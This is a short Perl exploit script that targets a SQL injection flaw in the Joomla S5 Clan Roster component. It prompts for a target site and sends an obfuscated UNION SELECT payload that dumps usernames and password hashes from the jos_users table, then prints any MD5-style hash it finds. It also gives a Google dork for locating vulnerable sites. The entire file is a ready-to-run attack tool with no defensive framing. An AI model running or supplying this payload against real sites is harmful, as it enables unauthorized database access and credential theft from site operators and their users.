#!/usr/bin/perl
#Exploit title: Joomla S5 Clan Roster com_s5clanroster SQL Injection exploit
#Google Dork: inurl:index.php?option=com_s5clanroster&
#Vendor HomePage: http://www.joomla.org/
system("clear");
system("cls");
print "=========================================================\n";
print "* Joomla S5 Clan Roster com_s5clanroster SQL Injection  *\n";
print "*               Coded by TheLooper                      *\n";
print "*        Greetz: To All My Friends <3                   *\n";
print "=========================================================\n";
sleep 1;
use LWP::UserAgent;
print "Enter the target site: ";
chomp(my $target=<STDIN>);
$code="%27+/*!50000UnIoN*/+/*!50000SeLeCt*/+group_concat(username,0x3a,password),222+from+jos_users--%20-";
$agent = LWP::UserAgent->new() or die "[!] Error while processing";
$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
$host= $target. "/index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=-null".$code;
$ok = $agent->request(HTTP::Request->new(GET=>$host));
$ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
print "[+] Password found --> $1\n$2\n";
sleep 1;
}
else
{
print "Password not found \n";
}